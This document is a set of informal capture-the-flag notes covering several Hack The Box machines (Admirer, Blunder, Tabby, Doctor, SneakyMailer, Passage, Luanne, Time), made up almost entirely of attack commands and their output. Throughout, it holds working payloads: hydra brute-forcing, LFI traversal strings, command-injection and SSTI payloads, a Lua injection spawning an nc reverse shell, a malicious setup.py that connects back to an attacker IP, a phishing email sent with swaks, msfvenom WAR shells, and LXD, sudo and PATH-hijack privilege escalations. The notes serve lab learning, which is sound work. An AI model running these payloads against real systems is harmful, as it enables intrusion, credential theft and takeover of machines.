	popen("free -h", "r")
	#so the binary run lshw,fdisk,free but without full path to binary
	#path injection maybe way to root
>touch lshw
	#!/bin/bash
	chown root:root /home/theseus/Download/bash
>chmod 777 lshw
>echo $PATH
>export PATH=/home/theseus/Download/:$PATH
>/bin/sysinfo
>bash -p











Admirer hackthebox
========================================
sudo autorecon 10.10.10.187
cat tcp_80_http_dirb.txt
http://10.10.10.187/robots.txt
	Disallow: /admin-dir
10.10.10.187/admin-dir/
	403 Forbidden
gobuster dir -u http://10.10.10.187/admin-dir/ -w /opt/directory-list-2.3-medium.txt -x .php,.html,.txt --timeout 50s -t 100 -o gbuster-admindir.txt
	/contacts.txt (Status: 200)
	/credentials.txt (Status: 200)
http://10.10.10.187/admin-dir/contacts.txt
http://10.10.10.187/admin-dir/credentials.txt
	#got some credz, ad user
hydra -L user.txt -e nsr ftp://10.10.10.187/
hydra -L user.txt -P pass.txt 10.10.10.187 ssh
	[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
	#try to login ssh failed
hydra -L user.txt -P pass.txt 10.10.10.187 ftp
	[21][ftp] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
ftp -p 10.10.10.187
>get dump.sql
>get html.tar.gz
>put user.txt
	#ftp not writable
tar -xzvf html.tar.gz
http://10.10.10.187/utility-scripts/admin_tasks.php
	#try to bypass with some excape bash failed
	#google "php == comparison bypass" got result but leads to nothing
	#https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/
	#https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html
cat db_admin.php
	#got credz waldo:]F7jLHw:*G>UPrTo}~A"d6b
	#try to hydra with ssh and ftp failed, should be there are mysql
gobuster dir -u 10.10.10.187/utility-scripts/ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -x .php,.html,.txt --timeout 50s -t 100
	/adminer.php (Status: 200)
http://10.10.10.187/utility-scripts/adminer.php
	#adminer 4.6.2 web service
	#https://podalirius.net/en/cves/2021-xxxxx/
	#we can read data from file with LOAD DATA local INFILE
	#but I cant login, try different credentials and guessing username still failed
	#spen a days to make it works, runnning dirbuster again with all different wordlist and extentionbut leads nowhere
	#open up a writeup, the key is connect database to our local machine
	#setup database on localhost
sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
	bind-address            = 0.0.0.0
sudo service mysql start
sudo mysql
>select User,Password,authentication_string from user;
	+-------------+----------+-----------------------+
	| User        | Password | authentication_string |
	+-------------+----------+-----------------------+
	| mariadb.sys |          |                       |
	| root        | invalid  | invalid               |
	| mysql       | invalid  | invalid               |
	+-------------+----------+-----------------------+
>ALTER USER 'root'@'localhost' IDENTIFIED BY 'kali';
>select User,Password,authentication_string from user;
	+-------------+-------------------------------------------+-------------------------------------------+
	| User        | Password                                  | authentication_string                     |
	+-------------+-------------------------------------------+-------------------------------------------+
	| mariadb.sys |                                           |                                           |
	| root        | *D64F6611CF18EA567ED1E8E74F2243AC1EDF54C4 | *D64F6611CF18EA567ED1E8E74F2243AC1EDF54C4 |
	| mysql       | invalid                                   | invalid                                   |
	+-------------+-------------------------------------------+-------------------------------------------+
>create table data ( text varchar(9999));
netstat -lntp
	tcp   0  0 0.0.0.0:3306   0.0.0.0:*    LISTEN
http://10.10.10.187/utility-scripts/adminer.php
	#back to adminer again and try to connect to my database
	#got error? open up wireshark and check mysql connection in tun0 
	G....j.Host '10.10.10.187' is not allowed to connect to this MariaDB server
	#google on it got result I should create new user for external user
mysql -u root -p
>CREATE USER 'adminer'@'localhost' IDENTIFIED BY 'adminer';
>GRANT ALL PRIVILEGES ON *.* TO 'adminer'@'localhost' WITH GRANT OPTION;
>CREATE USER 'adminer'@'%' IDENTIFIED BY 'adminer';
>GRANT ALL PRIVILEGES ON *.* TO 'adminer'@'%' WITH GRANT OPTION;
>FLUSH PRIVILEGES;
http://10.10.10.187/utility-scripts/adminer.php
	#can connect, now dump local file from target
LOAD DATA local INFILE '/etc/passwd' INTO TABLE data fields TERMINATED BY "\n";
	Error in query (2000): open_basedir restriction in effect. Unable to open file
	#got error? /etc/passwd should readable to all user? check another file belongs to www-data
LOAD DATA local INFILE '/var/www/html/index.php' INTO TABLE data fields TERMINATED BY "\n";
select * from data;
	#got index.php source code, and credentials mysql waldo:&<h5b~yK3F#{PaPB&dA}{H>
	#password can use on ssh
ssh waldo@10.10.10.187
>id
	uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
	#unusual groups, find file belongs to this group
>find / -group admins 2>/dev/null
	/opt/scripts/backup.py
	/opt/scripts/admin_tasks.sh
>sudo -l
	(ALL) SETENV: /opt/scripts/admin_tasks.sh
	#first time seen setenv on sudoer
	#abuse setenv sudo, this website cover hijacking python library on
	https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/
>cat /opt/scripts/admin_tasks.sh
	...snip...
	/opt/scripts/backup.py &
>cat /opt/scripts/backup.py
	from shutil import make_archive
	#so it load shutil.py library
>find / -name shutil.py 2>/dev/null
	/usr/lib/python3.5/shutil.py
	#hijack shutil with rev.py
>wget 10.10.14.16/rev.py
>chmod 777 rev.py
>cp rev.py shutil.py
	#abuse setenv sudo
	#https://stackoverflow.com/questions/35824788/sudo-e-does-not-pass-pythonpath
>sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
nc -lvp 443
#whoami
	root
	#after finish the box I read writeup and learn how to hijack library if we have write permision on directory
	#hijack python library
>python3 -c "import sys; print('\n'.join(sys.path))"
	
	/usr/lib/python35.zip
	/usr/lib/python3.5
	#the first empty line is directory of the script
	#so if we has permision to write on that directory, we can hijack python library
>cp /tmp/jembot/shutil.py /opt/scripts/
>sudo /opt/scripts/admin_tasks.sh 6
nc -lvp 443
#whoami
	root





Blunder Hackthebox
==========================================
sudo autorecon 10.10.10.191
cat tcp_80_http_dirb.txt
	#every cgi-bin exist I run gobuster on cgi-bin 
gobuster dir -u http://10.10.10.191/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .sh,.pl,.py --timeout 50s -t 100
http://10.10.10.191/todo.txt
	-Inform fergus that the new blog needs images - PENDING
	#got username fergus
http://10.10.10.191/
view-source:http://10.10.10.191/
	<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
	#with view source got bludit version 3.9.0
http://10.10.10.191/admin/
	#bludit login page, try to login default credential failed, try to sqli bypass got blocked
searchsploit bludit
	#exploit only shown bruteforce mitigation bypass, other exploit need to login
	#as enumeration going I run bruteforce with rockyou.txt
python3 48942.py -u user.txt -p /opt/rockyou.txt -l http://10.10.10.191/admin/
	UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
	#error codec, got this issue https://github.com/hamedA2/Zydra/issues/10
	#before
cat 48942.py
	...snip...
	userfile = open(Username_list).readlines()
	...snip...
	passfile = open(Password_list).readlines()
	...snip...
	#after
nano 48942.py
	userfile = open(Username_list, encoding='utf-8', errors='ignore').readlines()
	passfile = open(Password_list, encoding='utf-8', errors='ignore').readlines()
python3 48942.py -u user.txt -p /opt/rockyou.txt -l http://10.10.10.191/admin/
	#bruteforce is running very slow, and website says:
http://10.10.10.191/
	About: I created this site to dump my fact files, nothing more.......?
	#so I assume password not as long as rockyou.txt, password migh in the website
	#generate password with cewl
cewl -w asd.txt -d 10 -m 3 --with-numbers http://10.10.10.191/
python3 48942.py -u user.txt -p asd.txt -l http://10.10.10.191/admin/
	[+] Use Credential -> fergus:RolandDeschain
http://10.10.10.191/admin/
http://10.10.10.191/admin/edit-content/blender#
	#try to bypass upload file with .php file failed
	#google found this vulnerability, I tried to manual exploit it with burp but failed
	#https://github.com/bludit/bludit/issues/1081
	#exploit bludit rce CVE-2019-16113
wget https://github.com/ynots0ups/CVE-2019-16113/raw/master/cve-2019-16113.py
python3 cve-2019-16113.py
nc -lvp 443
>whoami
	www-data
	#unusual ftp directory inside root
>cd /ftp && ls
	#download all ftp data, extract everything and analyze, turn out it just rabit hole
unzip config
	unzip:  cannot find zipfile directory in one of config.gz
7z e config.gz
file config
	config: POSIX tar archive (GNU)
tar tf config
	buzz.wav
	#bludit config gile
	#https://forum.bludit.org/viewtopic.php?t=767
>cat  /var/www/bludit-3.9.2/bl-content/databases/user.php
	"password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
	"password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
>cat /var/www/bludit-3.10.0a/bl-content/databases/user.php
	"nickname": "Hugo",
	"password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
	#crack online got Hugo:Password120
>su hugo
>whoami
	hugo
>sudo -l
	(ALL, !root) /bin/bash
	#first time see !root in sudoer
>sudo -u temp /bin/bash
>sudo -u shaun /bin/bash
>id
	...130(lxd)...
	#I though I found the way to root, but there is no lxd or lxc on box
>dpkg -l | grep lxd
>dpkg -l | grep lxc
	#enumerate a days with that two user leads to nothing
	#open up a forum said exploit recent vulnerability
>find / -perm -4000 2>/dev/null | xargs ls -laht | grep -v snap
	-rwsr-xr-x 1 root root            560K Apr 27  2020 /usr/local/bin/sudo
	-rwsr-xr-x 1 root root            158K Jan 31  2020 /usr/bin/sudo
	#there are two sudo, weird, exploit sudo
>which sudo
	/usr/local/bin/sudo
>sudo -V
	Sudo version 1.8.25p1
	#google up found this website, exploit sudo < 1.8.27 https://www.exploit-db.com/exploits/47502
	#https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/	
>sudo -l
	(ALL, !root) /bin/bash
>sudo -u#-1 /bin/bash
#id
	uid=0(root) gid=1001(hugo) groups=1001(hugo)








Tabby Hachthebox
================================
sudo autorecon 10.10.10.194
	#two web service port 80 and 8080
cat tcp_80_http_dirb.txt
	+ http://10.10.10.194:80/index.php (CODE:200|SIZE:14175)
	+ http://10.10.10.194:80/news.php (CODE:200|SIZE:0)
http://10.10.10.194:8080
	#tomcat 9.0.31
http://10.10.10.194
http://megahosting.htb/news.php?file=statement
http://megahosting.htb/news.php?file=../../../etc/passwd
http://megahosting.htb/news.php?file=../../../../../proc/self/status
http://megahosting.htb/news.php?file=../../../../../etc/os-relase
	#got LFI but can't access log to log poisoning
http://megahosting.htb/news.php?file=../../../../../../var/log/apache2/error.log
http://megahosting.htb/news.php?file=../../../../../../var/log/apache2/error.log
	#LFI tomcat 9 user file
http://megahosting.htb/news.php?file=../../../../../etc/systemd/system/tomcat.service
http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
	#got credz tomcat:$3cureP4s5w0rd123!
http://megahosting.htb:8080/manager/status/all
	#login tomcat but only manager-script role, usually to upload war file in browser using manager-gui role
	#but we still have manager role, abuse manager-script role, exploit manager-scipt, RCE tomcat
http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/context.xml
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f war > exp.war
curl -v --upload-file webshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahost.htb:8080/host-manager/text/deploy?path=/webshell"
curl -v --upload-file webshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahost.htb:8080/manager/text/deploy?path=/webshell"
curl -v -u 'tomcat:$3cureP4s5w0rd123!' -T exp.war 'http://10.10.10.194:8080/manager/text/deploy?path=/exp&update=true'
nc -lvp 443
curl http://10.10.10.194:8888/exp
>whoami
	tomcat
>find /var/www/html/ -type f
	./files/16162020_backup.zip
wget http://10.10.10.194/files/16162020_backup.zip
	#crack zip file
fcrackzip -u -D -p /opt/rockyou.txt 16162020_backup.zip
	PASSWORD FOUND!!!!: pw == admin@it
	#crack zip and got password admin@it
>su ash
>id
	uid=1000(ash)...,116(lxd)
	#find lxd lxc, I though its another rabbit hole because there are no lxd in default path
>which lxc
>which lxc
>dpkg -l | grep lxd
	ii  lxd-agent-loader	0.4	all  LXD - VM agent loader
>lxd init
	Command 'lxd' is available in '/snap/bin/lxd'
>export PATH=/snap/bin:$PATH
	#after read writeup there are simple lxd privesc
	#https://0xdf.gitlab.io/2020/11/07/htb-tabby.html
	#LXD privesc LXC privesc
>lxd init
	#enter to the end
>wget http://10.10.14.4:8888/alpine.tar.gz
>lxc image list
>lxc image import alphine.tar.gz --alias imageku
>lxc init imageku ignite -c security.privileged=true
	#got error & need to init lxd
>lxd init
	#yes to all
>lxc init imageku ignite -c security.privileged=true
>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
>lxc start ignite
>lxc exec ignite /bin/sh
#id
	#full access system root, full root
#cp /mnt/root/bin/bash /mnt/root/home/ash/rootbash
#chmod 4755 /mnt/root/home/rootbash
>./rootbash -p
#id
	uid=1000(ash) gid=1000(ash) euid=0(root) groups=1000(ash),4(adm),...116(lxd)
	#only uid 0, change sudoers
>lxc exec ignite /bin/sh
#echo 'ash    ALL=(ALL:ALL) ALL' >> /mnt/root/etc/sudoers
>sudo -l
	(ALL : ALL) ALL
>sudo su
#id
	uid=0(root) gid=0(root) groups=0(root)







Doctor Hackthebox
========================================
sudo autorecon 10.10.10.209
https://10.10.10.209:8089
	#Splunk Atom Feed, Splunk build: 8.0.5, splunkd port 8089
	#there are exploit but need credentials default admin:changeme failed
http://10.10.10.209
	#just static html, try to gobuster more wordlist got nothing
	#in contact there are email info@doctors.htb, added to etc/hosts
http://doctors.htb/
	#new virtual website, login with sqli bypass failed
http://doctors.htb/register
	#create account, and logged in
http://doctors.htb/home
http://doctors.htb/post/new
	http://10.10.14.16/
	#create new note and I got connection back in my kali with curl user agent
nc -lvp 80
	User-Agent: curl/7.68.0
	#abuse curl rce, separate space with IFS
http://doctors.htb/post/new
	http://10.10.14.16/$(which$IFS'python3')
	http://10.10.14.16/$(which$IFS'wget')
	http://10.10.14.16/$(wget$IFS'10.10.14.16/rev.py'$IFS'-O'$IFS'/tmp/rev.py')
	http://10.10.14.16/$(python3$IFS'/tmp/rev.py')
	http://10.10.14.16/$(wget$IFS'10.10.14.16/rev.py')
	http://10.10.14.16/$(python3$IFS'rev.py')
nc -lvp 443
>whoami
	web
>bash linpeas.sh | tee web-doctor-linpeas.txt
>cat /opt/clean/site.db
	adminadmin@doctor.htbdefault.gif$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
	#there are hash started with $2b$, but there are no match hash in hashcat and hashid
>hashid '$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S'
	[+] Unknown hash
>id
	uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
	#user web in adm group, which can read log,examine log
>cd /var/log
>grep -EiR *password* * 2>/dev/null
>grep -EiR *pass* * 2>/dev/null
>grep -EiR *shaun* * 2>/dev/null
>cd /var/log/apache2
>ls -laht
	-rw-r-----  1 root adm     22K Sep 17  2020 backup
	#there are unusual log
>cat backup
	10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
	#got credz Guitar123
>su shaun
>id
	uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
>bash linpeas.sh | tee shaun-doctor-linpeas.txt
	#linpeas got nothing, cannot find credential to splunkd privesc
	#try to login splunkd with shaun:Guitar123 success lol
https://10.10.10.209:8089/services
	#splunkd privesc
	#https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence
	#https://github.com/cnotin/SplunkWhisperer2
sudo pip install requirements.txt
python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload "id | nc 10.10.14.16 80" --lhost 10.10.14.16
nc -lvp 80
	uid=0(root) gid=0(root) groups=0(root)
python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload "/tmp/rev.py" --lhost 10.10.14.16
nc -lvp 443
#whoami
	root
	#via local, convert to python3 since target only has python3 installed, convert python
>2to3-2.7 -w PySplunkWhisperer2_local.py
>./PySplunkWhisperer2_local.py --username shaun --password Guitar123 --payload 'chown root /tmp/rootbash ; chmod 4755 /tmp/rootbash'
>./rootbash -p
#visudo
	shaun ALL=(ALL) NOPASSWD:ALL
>sudo su
#whoami
	root
	#after read writeup, abuse curl is not the intended way
view-source:http://doctors.htb/login?next=
	<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
	#there are html command telling there are /archive directory
view-source:http://doctors.htb/archive
	<title>Archive</title>
	#when we login and update notes, archive page also updated
	#serve dynamic content into static website is vulnerable
	#exploit SSTI
http://doctors.htb/post/new
	${7*7}
	{{7*7}}
	{{7*'7'}}
	{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
	{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
	#ssti reverse shell
	{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('nc 10.10.14.16 80 | python3').read() }}








SneakyMailer Hackthebox
====================================================
	#I'm not in good condition at the time and this box is rated as medium hard so I didn't manage to solve this box by myself
sudo autorecon 10.10.10.197
http://sneakycorp.htb/team.php
	#got list of user and email
cat list.txt | sed 's/[[:blank:]]/:/g' | sed 's/::/:/g' > list2.txt
cat list2.txt| rev | cut -d ':' -f 1 | rev | cut -d '@' -f 1 > user.txt
cat list2.txt| rev | cut -d ':' -f 1 | rev > email.txt
	#enumerate user smtp
smtp-user-enum -M VRFY -U email.txt -t 10.10.10.197
	#got no result, try manual smtp user enum
nc 10.10.10.197 25
>ehlo asdasd
>vrfy jembotkuro
	550 5.1.1 <jembotkuro>: Recipient address rejected: User unknown in local recipient table
>vrfy airisatou@sneakymailer.htb
	252 2.0.0 airisatou@sneakymailer.htb
	#success, change default response to 20
smtp-user-enum -M VRFY -U email.txt -t 10.10.10.197 -p 25 -m 1 -v -w 20
	#all email are exist
	#enumerate ftp, webserver, smtp but leads to nothing
	#this is the hardest part and something new for me, I have to email to all that email list with phishing link to my machine
	#so I install email apps evolution
sudo apt install evolution
	#important to understand that port 25 smtp is to sending email and,
	#pop3 and imap use port 143 and 993 to receiving and read inbox
evolution
	file > new > new mail account
	identitiy> full name : asd, email: asd@sneakymailer.htb
	Receiving email> server type : IMAP, server : 10.10.10.197, port 993, username asd
	Sending email> Server type : SMTP, server 10.10.10.197, port 25
	OK
	#Compose email to all email list with link http://10.10.14.2/index.html
	#can use swaks to send phishong email
swaks --to $(cat email.txt | tr '\n' ',') --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.2/jembot" --server 10.10.10.197
nc -lvp 80
	User-Agent: python-requests/2.23.0
	firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
	#got credz paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
	#add new mail accont again on evolution and read sent email
	#login manual smtp
nc 10.10.10.197 143
>CAPABILITY
>A0001 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
>A0002 LIST "" "*"
	* LIST (\HasNoChildren) "." "INBOX.Sent Items"            
>A0003 SELECT "INBOX.Sent Items"
	* 2 EXISTS               
>A0004 FETCH 1 BODY.PEEK[]
>A005 FETCH 2 BODY.PEEK[]
	#got some credz, add again to list user.txt and pass.txt
hydra -L users.txt -P pass.txt 10.10.10.197 ssh
hydra -L users.txt -P pass.txt 10.10.10.197 ftp
	[21][ftp] host: 10.10.10.197   login: developer   password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
ftp 10.10.10.197
>cd dev
>dir
	#inside ftp there are web server file like sneakycorp.htb, but when I upload got nothing
	#the tricky part is here, there is something vhost development
	#search subdomain
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 400,403,404,301 -H "Host: FUZZ.sneakycorp.htb" -u http://sneakycorp.htb/ -t 50
	000000019:   200        340 L    989 W      13737 Ch    "dev"
>put phprev.php
curl curl http://dev.sneakycorp.htb/phprev.php
nc -lvp 443
>whoami
	www-data
	#read pypi credential
>cd pypi.sneakycorp.htb
>cat .htpasswd 
	pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
hashid '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'
	[+] Apache MD5
john --wordlist=/opt/rockyou.txt hash.txt
	soufianeelhaoui  (pypi)
	#got credz pypi
http://pypi.sneakycorp.htb:8080
	#configuration pypi webservice
>cat /etc/nginx/sites-enabled/pypi.sneakycorp.htb
	#abuse pypi
pip download sysstat
tar -xzvf sysstat-0.1.tar.gz
cat setup.py
	import socket,subprocess,os
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.10.14.78",443))
	os.dup2(s.fileno(),0) 
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	import pty
	pty.spawn("/bin/bash")
 
	from setuptools import setup, find_packages
	...snip...
	#reverse shell should come before setup code
	#create .pypirc file
	#https://stackoverflow.com/questions/18828805/how-can-i-install-packages-hosted-in-a-private-pypi-using-setup-py
cat ~/.pypirc
	[distutils]
	index-servers = jembot

	[jembot]
	repository: http://pypi.sneakycorp.htb:8080/
	username: pypi
	password: soufianeelhaoui
python3 setup.py sdist upload -r jembot
	#set up two listener, once connect type exit
nc -lvp 443
nc -lvp 443
>exit
>id
	uid=1000(low) gid=1000(low)...,119(pypi-pkg)
>sudo -l
	(root) NOPASSWD: /usr/bin/pip3
	#pip privesc
>cp rev.py setup.py
>sudo pip3 install .
nc -lvp 443
#whoami
	root










Passage Hackthebox
=====================================
sudo autorecon 10.10.10.206
	#my webenumeration got nothing, maybe there are waf to band my ip
http://10.10.10.206/index.php?do=rss
http://10.10.10.206/CuteNews
	#cutenews login, cutenews 2.1.2
searchsploit cutenews 2.1.2
	#manual exploit cute news 2.1.2
	#register, upload avatar, temper file to php file, rce
http://passage.htb/CuteNews/?register
http://10.10.10.206/CuteNews/index.php?mod=main&opt=personal
http://passage.htb/CuteNews/uploads/avatar_asd_asd.php?c=nc 10.10.14.2 80 | python
>whoami
	www-data
	#since there are user login attempt, it should has some database
	#looking database file can't find then realize there are no database port open
	#find on google cutenews use flat-file content means using no database
	#dump user cutenews
>cd /var/www/html/CuteNews/cdata/users
>cat *
	#got some base64, decrypt it, got some hash sha256
	#crack sha256
john hash.txt --wordlist=/opt/rockyou.txt --format=Raw-SHA256
	atlanta1	(paul)
>su paul
>whoami
	paul
>find .
	#there are something in .ssh
>cat .ssh/authorized_keys
>cat id_rsa
	#looklike nadav key, I try to ssh with nadav and success
	#alter read writeup, we can verify pubkey and privatekey
>ssh-keygen -y -f id_rsa
>cat authorized_keys
>diff <(ssh-keygen -y -f id_rsa) <(cat authorized_keys)
	#both are identical
>ssh nadav@localhost -i id_rsa
>bash linpeas.sh | tee nadav-passage-linpeas.txt
	USBCreator Vulnerable!!
	#https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
	#exploit usbcreator
>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
ssh -i root_idrsa root@passage.htb
#id
	root
	#looklike linpeas just updated usbcreator detection, it's doesn't detect when the machine live
	#that makes this box rated as medium, enumerate subcreator vulnerability
>whoami
	nadav
	#viminfo, https://superuser.com/questions/323365/are-vimrc-and-viminfo-the-same-files-but-with-different-names/323368#323368
>cat .viminfo
	...snip...
	'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	#so viminfo store what file has edited
>cp /etc/passwd passwd.new
>openssl passwd -1 asdasd
>echo 'rooot:$1$XnfmdSNG$hGFI0NLAYPHfGnNNvpf2k.:0:0:jembot kuro:/root:/bin/bash' >> passwd.new
>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/passwd.new /etc/passwd true
>su rooot
#whoami
	root






Luanne Hackthebox
=========================================
sudo autorecon 10.10.10.218
cat tcp_22_ssh_nmap.txt
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
	#NetBSD box
cat tcp_9001_http_nmap.txt
	9001/tcp open  http   Medusa httpd 1.12 (Supervisor process manager)
http://10.10.10.218:9001
	#should authenticate, search "supervisor process manager default credentials" found this website
	#https://developpaper.com/supervisor-process-manager/
	#default credentials are user:123
http://10.10.10.218:9001/tail.html?processname=processes
	/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
	#-u: Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html
	#-i 127.0.0.1: listen on localhost
	#-I 3000: listen on port 3000
	#-L weather weather.lua: Adds a Lua script for the prefix weather. So Visiting http://10.10.10.218/weather/[something]
	#-U _http: Run as _http user
	#/var/www: Root directory to serve from
http://luanne.htb/
http://luanne.htb/weather/
	404 not found
	#the weird thing of lua script is even weather directory doestn't exist, if file match under weather then got success
gobuster dir -u http://10.10.10.218/weather/ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt   --timeout 50s -t 100
http://10.10.10.218/weather/forecast
	"No city specified. Use 'city=list' to list available cities."
	#got json response, look like api
wfuzz -c -w cities.txt --hc 500 -u 'http://luanne.htb/weather/forecast?city=FUZZ' -t 50
	#got nothing, try to inject parameter with special character with burp and got ' makes error
	#google "lua injection" got this website
	#https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities
	#lua injection
view-source:http://luanne.htb/weather/forecast?city=London') c=os.clock t=c() while c()- t<=3 do end x=('`
view-source:http://luanne.htb/weather/forecast?city=London') os.execute("id") x=('
view-source:http://luanne.htb/weather/forecast?city=') os.execute("id") x=('
view-source:http://luanne.htb/weather/forecast?city=') os.execute("id")+--('
	#lua reverse shell
curl "http://luanne.htb/weather/forecast?city=')+os.execute('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f')+x=('"
	') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 >/tmp/f') x=('
nc -lvp 443
>whoami
	_httpd
>find / | grep python
>/usr/pkg/bin/python3.7 -V
	ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.elf_so, for NetBSD 9.0, stripped
>/usr/pkg/bin/python3.7 -c 'import pty;pty.spawn("/bin/sh")'
>cat .htpasswd
	webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
john hash.txt --wordlist=/opt/rockyou.txt
	iamthebest       (webapi_user)
	#got credz webapi_user:iamthebest but can't use it anywhere
>ps -aux
	/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
	#there are another lua script run as weather on port 3001
>netstat -an
>curl http://127.0.0.1:3001/weather/forecast
	#ssh tunnel port 3001
sudo service ssh start
>ssh kali@10.10.14.16
ssh> -R 3001:localhost:3001
gobuster dir -u http://localhost:3001/weather/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --timeout 50s -t 100
view-source:http://localhost:3001/weather/forecast?city=') os.execute("id") x=('
	#look like same webservice with same api but not vulnerable to lua injetion
	#home dir read
	#in httpd there are -u options so we should can read /~user/
http://localhost:3001/~r.michaels/
	#prompt password, using credential webapi_user:iamthebest
http://localhost:3001/~r.michaels/id_rsa
ssh -i rmicahe_idrsa r.michaels@10.10.10.218
>whoami
	r.michaels
	#there is backup directory with encrypted file
>file devel_backup-2020-09-16.tar.gz.enc
	devel_backup-2020-09-16.tar.gz.enc: data
	#google file.enc looklike file with encrypted with openssl
	#so I download bruteforce openssl decrypt but failed
	#turn out encrpted file on netBSD using keyrings in .gnupg
>ls -la .gnupg/
	-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
	-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg
	#google "decrypt file netbsd" found this website
	#https://man.netbsd.org/netpgp.1
>netpgp --decrypt --output=/tmp/backup backups/devel_backup-2020-09-16.tar.gz.enc
	uid              RSA 2048-bit key <r.michaels@localhost>
>file /tmp/backup
	/tmp/backup: gzip compressed data,...
>tar xzvf backup
>cat devel-2020-09-16/www/.htpasswd
	webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
john hash.txt --wordlist=/opt/rockyou.txt
	littlebear       (webapi_user)
	#sudo on netbsd
>doas whoami
	root
>doas sh
#whoami
	root










Time Hackthebox
==========================================
sudo autorecon 10.10.10.214
cat tcp_80_http_dirb.txt
	#only index.pyp
http://10.10.10.214/
	Online JSON beautifier & validator
POST / HTTP/1.1
mode=1&data=json
	#beautifier just to print into json format
POST / HTTP/1.1
mode=1&data=json
	Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'asdasdasd': was expecting ('true', 'false' or 'null')
	#validate to validate data?
	#search on google "com.fasterxml.jackson.core.JsonParseException exploit" found this cve
	#https://blog.doyensec.com/2019/07/22/jackson-gadgets.html CVE-2019-12384
	#google "CVE-2019-12384 poc" found this website
	#https://github.com/jas502n/CVE-2019-12384
cat asd.sql
	...snap...
	CALL SHELLEXEC('nc 10.10.14.4 443')
